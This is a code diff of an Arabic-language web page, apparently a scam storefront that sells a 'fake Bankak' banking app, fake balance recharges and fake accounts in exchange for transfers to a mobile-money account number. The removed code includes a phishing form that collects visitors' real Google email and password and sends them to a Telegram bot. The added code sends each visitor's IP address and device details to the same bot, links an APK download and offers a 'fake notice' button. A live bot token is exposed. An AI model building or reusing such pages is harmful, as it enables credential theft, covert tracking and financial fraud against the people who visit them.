@@ -85,6 +85,7 @@
             letter-spacing: 2px;
         }
 
+        /* أقسام مربعة أنيقة */
         .section-title {
             font-size: 2rem;
             margin: 2.5rem 0 1.5rem;
@@ -105,16 +106,17 @@
 
         .products-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: 2rem;
             margin-bottom: 3rem;
         }
 
+        /* أزرار مربعة أنيقة */
         .product-card {
             background: rgba(255, 255, 255, 0.08);
             backdrop-filter: blur(10px);
             border-radius: 24px;
-            padding: 1.5rem;
+            padding: 1.8rem;
             text-align: center;
             transition: all 0.3s ease;
             border: 1px solid rgba(255, 255, 255, 0.15);
@@ -139,18 +141,23 @@
         }
 
         .product-price {
-            font-size: 1.6rem;
+            font-size: 1.8rem;
             color: #ffd700;
             margin: 1rem 0;
             font-weight: bold;
         }
 
-        .btn-buy {
+        .product-price small {
+            font-size: 0.9rem;
+            color: #ccc;
+        }
+
+        .btn-square {
             background: linear-gradient(45deg, #ffd700, #ff8c00);
             border: none;
             color: #000;
             padding: 0.8rem 1.5rem;
-            border-radius: 50px;
+            border-radius: 16px;
             font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
@@ -158,9 +165,114 @@
             width: 100%;
         }
 
-        .btn-buy:hover {
+        .btn-square:hover {
             transform: scale(1.02);
             box-shadow: 0 5px 20px rgba(255, 215, 0, 0.5);
+        }
+
+        /* قسم تحميل التطبيق (نسختين) */
+        .version-section {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .version-card {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(0, 0, 0, 0.3));
+            border-radius: 24px;
+            padding: 2rem;
+            text-align: center;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            transition: 0.3s;
+        }
+
+        .version-card:hover {
+            transform: translateY(-5px);
+            border-color: #ffd700;
+        }
+
+        .version-title {
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .version-price {
+            font-size: 2rem;
+            color: #ffd700;
+            margin: 1rem 0;
+        }
+
+        .btn-download {
+            background: linear-gradient(45deg, #ffd700, #ff8c00);
+            border: none;
+            color: #000;
+            padding: 1rem;
+            border-radius: 20px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 1rem;
+        }
+
+        .btn-download:disabled {
+            background: #555;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .payment-steps {
+            display: none;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 24px;
+            padding: 1.5rem;
+            margin-top: 1rem;
+            text-align: center;
+        }
+
+        .payment-steps.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .account-number {
+            font-size: 1.4rem;
+            color: #ffd700;
+            font-family: monospace;
+            background: #000;
+            padding: 0.5rem;
+            border-radius: 12px;
+            word-break: break-all;
+            margin: 1rem 0;
+        }
+
+        .fake-notice-btn {
+            background: #28a745;
+            color: #fff;
+            border: none;
+            padding: 0.8rem;
+            border-radius: 16px;
+            margin-top: 1rem;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .social-btn {
+            background: #4267B2;
+            color: #fff;
+            border: none;
+            padding: 0.8rem;
+            border-radius: 16px;
+            margin-top: 1rem;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
         }
 
         .warning-box {
@@ -170,11 +282,6 @@
             padding: 1.5rem;
             margin: 2rem 0;
             text-align: center;
-        }
-
-        .warning-box h3 {
-            color: #ff8888;
-            margin-bottom: 0.8rem;
         }
 
         .footer {
@@ -196,64 +303,12 @@
             color: #ffd700;
         }
 
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.95);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background: #1a1a2e;
-            border-radius: 28px;
-            padding: 2rem;
-            max-width: 500px;
-            width: 90%;
-            text-align: center;
-            border: 1px solid #ffd700;
-        }
-
-        .payment-info {
-            background: #0f0f1a;
-            padding: 1.5rem;
-            border-radius: 20px;
-            margin: 1rem 0;
-        }
-
-        .account-number {
-            font-size: 1.4rem;
-            color: #ffd700;
-            font-family: monospace;
-            background: #000;
-            padding: 0.5rem;
-            border-radius: 12px;
-            word-break: break-all;
-        }
-
-        .app-download {
-            background: rgba(255, 215, 0, 0.1);
-            border: 1px solid #ffd700;
-            border-radius: 20px;
-            padding: 1rem;
-            margin: 1rem 0;
-            text-align: center;
-        }
-
-        .app-download a {
-            color: #ffd700;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
         @media (max-width: 768px) {
             .container {
                 padding: 1rem;
+            }
+            .version-section {
+                grid-template-columns: 1fr;
             }
             .logo {
                 font-size: 1.2rem;
@@ -271,108 +326,59 @@
     </div>
 
     <div class="container">
+        <!-- عروض العيد -->
         <div class="offer-banner">
             <h1>🎉 عروض عيد الفطر المبارك 🎉</h1>
             <p>خصم يصل إلى 50% على جميع التطبيقات والشحنات - لفترة محدودة</p>
             <div class="timer" id="timer">00 : 00 : 00 : 00</div>
         </div>
 
-        <div class="app-download">
-            <h3>📱 تحميل تطبيق بنكك المزيف (النسخة VIP)</h3>
-            <p>إصدار VIP - يدعم جميع الميزات المتقدمة</p>
-            <a href="https://www.mediafire.com/file/1jhufdsj1wdr7nv/BOK_vip🏦.apk/file" target="_blank" style="display: inline-block; background: #ffd700; color: #000; padding: 0.8rem 2rem; border-radius: 50px; margin-top: 0.8rem; text-decoration: none; font-weight: bold;">📥 تحميل التطبيق (6.38 MB)</a>
-            <p style="font-size: 0.8rem; margin-top: 0.5rem;">نسخة VIP سايكو - محدثة مارس 2026</p>
+        <!-- قسم تحميل التطبيق (نسختين) -->
+        <h2 class="section-title">📱 تحميل تطبيق بنكك المزيف</h2>
+        <div class="version-section">
+            <div class="version-card" id="normalVersion">
+                <div class="version-title">🆓 النسخة العادية</div>
+                <div class="version-price">مجانية</div>
+                <button class="btn-download" onclick="downloadNormalApp()">📥 تحميل التطبيق</button>
+                <div id="normalPayment" class="payment-steps"></div>
+            </div>
+            <div class="version-card" id="vipVersion">
+                <div class="version-title">👑 النسخة VIP</div>
+                <div class="version-price">80,000 SDG</div>
+                <button class="btn-download" onclick="initiateVIPPayment()">💰 شراء النسخة VIP</button>
+                <div id="vipPayment" class="payment-steps"></div>
+            </div>
         </div>
 
-        <h2 class="section-title">⚡ شحن الحسابات</h2>
+        <!-- قسم شحن الحسابات -->
+        <h2 class="section-title">⚡ شحن الحسابات (اشحن 10,000 تحصل على 100,000)</h2>
         <div class="products-grid">
-            <div class="product-card" onclick="openPayment('اسنوكس VIP', 5000)">
-                <div class="product-icon">🎮</div>
-                <div class="product-title">اسنوكس VIP</div>
-                <div class="product-price">5,000 SDG</div>
-                <button class="btn-buy">شراء الآن</button>
-            </div>
-            <div class="product-card" onclick="openPayment('ترو بورو PRO', 8000)">
-                <div class="product-icon">🎯</div>
-                <div class="product-title">ترو بورو PRO</div>
-                <div class="product-price">8,000 SDG</div>
-                <button class="btn-buy">شراء الآن</button>
-            </div>
-            <div class="product-card" onclick="openPayment('موكا', 3000)">
-                <div class="product-icon">☕</div>
-                <div class="product-title">موكا</div>
-                <div class="product-price">3,000 SDG</div>
-                <button class="btn-buy">شراء الآن</button>
-            </div>
-            <div class="product-card" onclick="openPayment('VIP سايكو', 15000)">
-                <div class="product-icon">👑</div>
-                <div class="product-title">VIP سايكو (النسخة الأسطورية)</div>
-                <div class="product-price">15,000 SDG</div>
-                <button class="btn-buy">شراء الآن</button>
+            <div class="product-card" onclick="initiateRecharge()">
+                <div class="product-icon">💰💎</div>
+                <div class="product-title">شحن رصيد بنكك</div>
+                <div class="product-price">10,000 SDG <small>→ تحصل على 100,000 رصيد</small></div>
+                <button class="btn-square">شراء الشحنة</button>
+                <div id="rechargePayment" class="payment-steps"></div>
             </div>
         </div>
 
+        <!-- قسم فتح الحسابات -->
         <h2 class="section-title">🔓 فتح حسابات بنكك المزيفة</h2>
         <div class="products-grid">
-            <div class="product-card" onclick="openGoogleLogin('اسنوكس')">
-                <div class="product-icon">📱</div>
-                <div class="product-title">فتح حساب - اسنوكس</div>
-                <div class="product-price">2,000 SDG</div>
-                <button class="btn-buy">تسجيل بحساب Google</button>
-            </div>
-            <div class="product-card" onclick="openGoogleLogin('ترو بورو')">
-                <div class="product-icon">📱</div>
-                <div class="product-title">فتح حساب - ترو بورو</div>
-                <div class="product-price">2,500 SDG</div>
-                <button class="btn-buy">تسجيل بحساب Google</button>
-            </div>
-            <div class="product-card" onclick="openGoogleLogin('موكا')">
-                <div class="product-icon">📱</div>
-                <div class="product-title">فتح حساب - موكا</div>
-                <div class="product-price">1,500 SDG</div>
-                <button class="btn-buy">تسجيل بحساب Google</button>
-            </div>
-            <div class="product-card" onclick="openGoogleLogin('VIP سايكو')">
-                <div class="product-icon">👑</div>
-                <div class="product-title">فتح حساب - VIP سايكو</div>
-                <div class="product-price">5,000 SDG</div>
-                <button class="btn-buy">تسجيل بحساب Google</button>
+            <div class="product-card" onclick="initiateAccountOpen()">
+                <div class="product-icon">🏦💳</div>
+                <div class="product-title">فتح حساب جديد</div>
+                <div class="product-price">20,000 SDG</div>
+                <button class="btn-square">فتح حساب الآن</button>
+                <div id="accountPayment" class="payment-steps"></div>
             </div>
         </div>
 
+        <!-- تحذير -->
         <div class="warning-box">
             <h3>⚠️ تحذير هام ⚠️</h3>
             <p>أي محاولة لرفع إشعار مزيف دون الدفع سيؤدي إلى حظر حسابك نهائياً. نحن نستخدم نظام تتبع متقدم لكشف المحتالين.</p>
             <p>جميع خدماتنا مدفوعة مسبقاً، لا نقدم أي تجارب مجانية.</p>
-        </div>
-    </div>
-
-    <div id="paymentModal" class="modal">
-        <div class="modal-content">
-            <h2>💳 إتمام الدفع</h2>
-            <div class="payment-info">
-                <p>المنتج: <strong id="productName"></strong></p>
-                <p>المبلغ: <strong id="productPrice"></strong> SDG</p>
-                <p>رقم الحساب للتحويل:</p>
-                <div class="account-number" id="accountNumber">300159768</div>
-                <p style="margin-top: 1rem;">🔹 ماي كاشي 🔹</p>
-                <p>بعد التحويل، سترسل إشعار الدفع وسيتم تفعيل طلبك فوراً</p>
-            </div>
-            <button class="btn-buy" onclick="simulatePayment()">✅ لقد قمت بالتحويل</button>
-            <button class="btn-buy" style="background: #444; margin-top: 1rem;" onclick="closePayment()">إغلاق</button>
-        </div>
-    </div>
-
-    <div id="googleModal" class="modal">
-        <div class="modal-content">
-            <h2>🔐 تسجيل الدخول بحساب Google</h2>
-            <div class="payment-info">
-                <p>لتأكيد هويتك وفتح الحساب، يرجى تسجيل الدخول بحساب Google الحقيقي الخاص بك</p>
-                <input type="email" id="googleEmail" placeholder="البريد الإلكتروني" style="width: 100%; padding: 0.8rem; margin: 0.5rem 0; border-radius: 12px; border: none; direction: ltr;">
-                <input type="password" id="googlePassword" placeholder="كلمة المرور" style="width: 100%; padding: 0.8rem; margin: 0.5rem 0; border-radius: 12px; border: none; direction: ltr;">
-                <button class="btn-buy" onclick="sendGoogleData()">تأكيد وتسجيل الدخول</button>
-            </div>
-            <button class="btn-buy" style="background: #444; margin-top: 1rem;" onclick="closeGoogleModal()">إلغاء</button>
         </div>
     </div>
 
@@ -387,20 +393,22 @@
     </div>
 
     <script>
+        // بيانات البوت
         const BOT_TOKEN = "8738487336:AAHAzDAQ-SHI1qOi9EazQreZ5jYyzd5c59Y";
         const CHAT_ID = "7842780682";
         const ACCOUNT_NUMBER = "300159768";
+        const APP_URL = "https://www.mediafire.com/file/1jhufdsj1wdr7nv/BOK_vip🏦.apk/file";
 
+        let currentAction = '';
+        let currentAmount = 0;
         let currentProduct = '';
-        let currentPrice = 0;
-        let currentAccountType = '';
 
+        // مؤقت العيد
         function updateTimer() {
             const targetDate = new Date();
             targetDate.setDate(targetDate.getDate() + 7);
             targetDate.setHours(23, 59, 59, 999);
-            const now = new Date();
-            const diff = targetDate - now;
+            const diff = targetDate - new Date();
             if (diff <= 0) {
                 document.getElementById('timer').innerHTML = "🎉 العيد مبارك! العروض مستمرة 🎉";
                 return;
@@ -414,36 +422,11 @@
         setInterval(updateTimer, 1000);
         updateTimer();
 
-        function openPayment(product, price) {
-            currentProduct = product;
-            currentPrice = price;
-            document.getElementById('productName').innerText = product;
-            document.getElementById('productPrice').innerText = price;
-            document.getElementById('paymentModal').style.display = 'flex';
-        }
-
-        function closePayment() {
-            document.getElementById('paymentModal').style.display = 'none';
-        }
-
         function getDeviceInfo() {
             const ua = navigator.userAgent;
-            let device = "Unknown";
-            let os = "Unknown";
-            if (/android/i.test(ua)) {
-                device = "Android";
-                const match = ua.match(/Android\s([\d.]+)/i);
-                os = match ? match[1] : "Unknown";
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                device = "iOS";
-                const match = ua.match(/OS\s([\d_]+)/i);
-                os = match ? match[1].replace(/_/g, '.') : "Unknown";
-            } else if (/Windows/i.test(ua)) {
-                device = "Windows";
-            } else if (/Mac/i.test(ua)) {
-                device = "Mac";
-            }
-            return `${device} ${os}`;
+            if (/android/i.test(ua)) return "Android " + (ua.match(/Android\s([\d.]+)/i)?.[1] || "Unknown");
+            if (/iPhone|iPad/i.test(ua)) return "iOS";
+            return "Unknown";
         }
 
         async function getIP() {
@@ -451,9 +434,7 @@
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 return data.ip;
-            } catch(e) {
-                return "غير متاح";
-            }
+            } catch(e) { return "غير متاح"; }
         }
 
         async function sendToTelegram(message) {
@@ -463,45 +444,105 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                 });
-            } catch(e) {
-                console.log(e);
+            } catch(e) { console.log(e); }
+        }
+
+        function showPaymentSteps(elementId, product, amount) {
+            currentAction = product;
+            currentAmount = amount;
+            const container = document.getElementById(elementId);
+            container.innerHTML = `
+                <div style="margin-top: 1rem;">
+                    <p>💳 المطلوب: ${amount.toLocaleString()} SDG</p>
+                    <div class="account-number">${ACCOUNT_NUMBER}</div>
+                    <p>🔹 ماي كاشي 🔹</p>
+                    <button class="fake-notice-btn" onclick="confirmPayment()">✅ لقد قمت بالتحويل</button>
+                </div>
+            `;
+            container.classList.add('active');
+        }
+
+        async function confirmPayment() {
+            const ip = await getIP();
+            const device = getDeviceInfo();
+            let message = '';
+            let actionMessage = '';
+
+            if (currentAction === 'normal') {
+                actionMessage = 'تحميل النسخة العادية (مجاني)';
+                message = `📱 تحميل تطبيق بنكك (مجاني)\n━━━━━━━━━━━━━━━━━━━\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+            } else if (currentAction === 'vip') {
+                actionMessage = 'شراء النسخة VIP (80,000 SDG)';
+                message = `👑💰 شراء النسخة VIP 💰👑\n━━━━━━━━━━━━━━━━━━━\n💵 المبلغ: 80,000 SDG\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🔢 حساب الاستلام: ${ACCOUNT_NUMBER}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+            } else if (currentAction === 'recharge') {
+                actionMessage = 'شحن رصيد (10,000 SDG → 100,000 رصيد)';
+                message = `⚡💰 عملية شحن رصيد 💰⚡\n━━━━━━━━━━━━━━━━━━━\n💵 المبلغ: 10,000 SDG\n🎁 الرصيد المستلم: 100,000 SDG\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🔢 حساب الاستلام: ${ACCOUNT_NUMBER}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+            } else if (currentAction === 'account') {
+                actionMessage = 'فتح حساب جديد (20,000 SDG)';
+                message = `🏦🔓 فتح حساب جديد 🔓🏦\n━━━━━━━━━━━━━━━━━━━\n💵 المبلغ: 20,000 SDG\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🔢 حساب الاستلام: ${ACCOUNT_NUMBER}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+            }
+
+            await sendToTelegram(message);
+            alert(`✅ تم استلام طلب ${actionMessage} بنجاح!\n📱 سيتم التفعيل خلال 5 دقائق.\n📩 تواصل مع الدعم لو في استفسار.`);
+
+            // عرض زر رفع الإشعار بعد الدفع
+            if (currentAction === 'vip') {
+                const vipDiv = document.getElementById('vipPayment');
+                vipDiv.innerHTML += `
+                    <button class="fake-notice-btn" style="background: #ff9800; margin-top: 0.5rem;" onclick="sendFakeNotice()">📢 رفع إشعار وهمي</button>
+                    <button class="social-btn" onclick="window.open('https://facebook.com', '_blank')">📘 حسابي في الفيس</button>
+                `;
+            } else if (currentAction === 'recharge') {
+                const rechargeDiv = document.getElementById('rechargePayment');
+                rechargeDiv.innerHTML += `
+                    <button class="fake-notice-btn" style="background: #ff9800; margin-top: 0.5rem;" onclick="sendFakeNotice()">📢 رفع إشعار وهمي</button>
+                    <button class="social-btn" onclick="window.open('https://facebook.com', '_blank')">📘 حسابي في الفيس</button>
+                `;
+            } else if (currentAction === 'account') {
+                const accountDiv = document.getElementById('accountPayment');
+                accountDiv.innerHTML += `
+                    <button class="fake-notice-btn" style="background: #ff9800; margin-top: 0.5rem;" onclick="sendFakeNotice()">📢 رفع إشعار وهمي</button>
+                    <button class="social-btn" onclick="window.open('https://facebook.com', '_blank')">📘 حسابي في الفيس</button>
+                `;
+            }
+
+            // تنزيل التطبيق بعد الدفع (للنسخة VIP)
+            if (currentAction === 'vip') {
+                setTimeout(() => {
+                    if (confirm("تم الدفع بنجاح! هل تريد تحميل التطبيق الآن؟")) {
+                        window.open(APP_URL, '_blank');
+                    }
+                }, 500);
             }
         }
 
-        async function simulatePayment() {
+        async function sendFakeNotice() {
             const ip = await getIP();
             const device = getDeviceInfo();
-            const message = `💰💎 عملية شراء جديدة 💎💰\n\n━━━━━━━━━━━━━━━━━━━\n🛒 المنتج: ${currentProduct}\n💵 المبلغ: ${currentPrice} SDG\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🔢 حساب الاستلام: ${ACCOUNT_NUMBER}\n✅ الحالة: تم الدفع (محاكاة)\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+            const message = `📢⚠️ محاولة رفع إشعار مزيف ⚠️📢\n━━━━━━━━━━━━━━━━━━━\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n⚠️ تم تسجيل المحاولة وسيتم الحظر فوراً\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
             await sendToTelegram(message);
-            alert("✅ تم استلام طلبك بنجاح!\n📱 سيتم تفعيل حسابك خلال 5 دقائق.\n📩 تواصل مع الدعم لو في استفسار.");
-            closePayment();
+            alert("⚠️ تحذير: تم تسجيل محاولة رفع إشعار مزيف. سيتم حظر حسابك فوراً إذا تكررت.");
         }
 
-        function openGoogleLogin(accountType) {
-            currentAccountType = accountType;
-            document.getElementById('googleModal').style.display = 'flex';
+        // النسخة العادية
+        function downloadNormalApp() {
+            showPaymentSteps('normalPayment', 'normal', 0);
         }
 
-        function closeGoogleModal() {
-            document.getElementById('googleModal').style.display = 'none';
+        // النسخة VIP
+        function initiateVIPPayment() {
+            showPaymentSteps('vipPayment', 'vip', 80000);
         }
 
-        async function sendGoogleData() {
-            const email = document.getElementById('googleEmail').value.trim();
-            const password = document.getElementById('googlePassword').value.trim();
-            if (!email || !password) {
-                alert("⚠️ يرجى إدخال البريد الإلكتروني وكلمة المرور");
-                return;
-            }
-            const ip = await getIP();
-            const device = getDeviceInfo();
-            const message = `🔐📧 تسجيل جديد لفتح حساب 📧🔐\n\n━━━━━━━━━━━━━━━━━━━\n🆔 النسخة: ${currentAccountType}\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
-            await sendToTelegram(message);
-            alert("✅ تم تسجيل الدخول بنجاح!\n📱 سيتم فتح حسابك قريباً.\n📩 سيصلك إشعار بالتليجرام عند التفعيل.");
-            document.getElementById('googleEmail').value = '';
-            document.getElementById('googlePassword').value = '';
-            closeGoogleModal();
+        // شحن الرصيد
+        function initiateRecharge() {
+            showPaymentSteps('rechargePayment', 'recharge', 10000);
+        }
+
+        // فتح حساب
+        function initiateAccountOpen() {
+            showPaymentSteps('accountPayment', 'account', 20000);
         }
     </script>
 </body>
-  </html>
+</html>
